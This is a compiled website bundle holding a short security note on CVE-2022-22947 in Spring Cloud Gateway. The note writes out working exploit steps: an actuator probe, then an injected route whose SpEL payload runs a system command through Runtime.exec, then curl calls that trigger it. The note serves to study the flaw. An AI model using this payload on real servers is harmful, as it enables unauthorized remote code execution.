/*! For license information please see bbc8eeff.3f219d19.js.LICENSE.txt */
"use strict";(self.webpackChunkwener_website=self.webpackChunkwener_website||[]).push([[15920],{21797:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>u,frontMatter:()=>a,metadata:()=>o,toc:()=>l});var r=t(11527),s=t(47214);const a={title:"CVE"},i="CVE",o={id:"security/cve",title:"CVE",description:"- https://www.cve.org/",source:"@site/../notes/security/cve.md",sourceDirName:"security",slug:"/security/cve",permalink:"/notes/security/cve",draft:!1,unlisted:!1,editUrl:"https://github.com/wenerme/wener/edit/master/notes/../notes/security/cve.md",tags:[],version:"current",lastUpdatedBy:"wener",lastUpdatedAt:1693463269,formattedLastUpdatedAt:"Aug 31, 2023",frontMatter:{title:"CVE"},sidebar:"docs",previous:{title:"SOPS",permalink:"/notes/security/crypto/sops"},next:{title:"DDoS",permalink:"/notes/security/ddos"}},c={},l=[{value:"CVE-2022-22947",id:"cve-2022-22947",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"cve",children:"CVE"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.cve.org/",children:"https://www.cve.org/"})}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"cve-2022-22947",children:"CVE-2022-22947"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Java, SpringCloud Gateway\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"3.1.0"}),"\n",(0,r.jsx)(n.li,{children:"3.0.0-3.0.6"}),"\n",(0,r.jsx)(n.li,{children:"< 3.0"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \u6d4b\u8bd5 gateway \u662f\u5426\u5f00\u542f actuator \u7ba1\u7406\ncurl -X POST http://gateway/actuator/gateway/refresh -v\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u6ce8\u5165\u6076\u610f\u8def\u7531"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:'POST http://gateway/actuator/gateway/routes/pentest\nContent-Type: application/json\n\n{\n  "id": "pentest",\n  "filters": [\n    {\n      "name": "AddResponseHeader",\n      "args": {\n        "name": "X-Request-Foo",\n        "": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"\n      },\n      "uri": "http://httpbin.org/get",\n      "predicates": [\n        {\n          "name": "Method",\n          "args": {\n            "_key_0": "GET"\n          }\n        },\n        {\n          "name": "Path",\n          "args": {\n            "_key_0": "/pentest"\n          }\n        }\n      ]\n    }\n  ]\n}\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \u5237\u65b0\ncurl -X POST http://gateway/actuator/gateway/refresh -v\n# \u65b0\u7684\u8def\u7531\u5305\u542b X-Request-Foo: $(whoami)\ncurl -X POST http://gateway/pentest -v\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u914d\u7f6e\u4e0d\u540c\u65f6\u6ee1\u8db3\u5373\u53ef"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-ini",children:"management.endpoint.gateway.enabled=true # default value\nmanagement.endpoints.web.exposure.include=gateway\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://spring.io/security/cve-2022-22947",children:"https://spring.io/security/cve-2022-22947"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.anquanke.com/post/id/269795",children:"https://www.anquanke.com/post/id/269795"})}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},3354:(e,n,t)=>{var r=t(50959),s=Symbol.for("react.element"),a=Symbol.for("react.fragment"),i=Object.prototype.hasOwnProperty,o=r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,c={key:!0,ref:!0,__self:!0,__source:!0};function l(e,n,t){var r,a={},l=null,d=null;for(r in void 0!==t&&(l=""+t),void 0!==n.key&&(l=""+n.key),void 0!==n.ref&&(d=n.ref),n)i.call(n,r)&&!c.hasOwnProperty(r)&&(a[r]=n[r]);if(e&&e.defaultProps)for(r in n=e.defaultProps)void 0===a[r]&&(a[r]=n[r]);return{$$typeof:s,type:e,key:l,ref:d,props:a,_owner:o.current}}n.Fragment=a,n.jsx=l,n.jsxs=l},11527:(e,n,t)=>{e.exports=t(3354)},47214:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>i});var r=t(50959);const s={},a=r.createContext(s);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);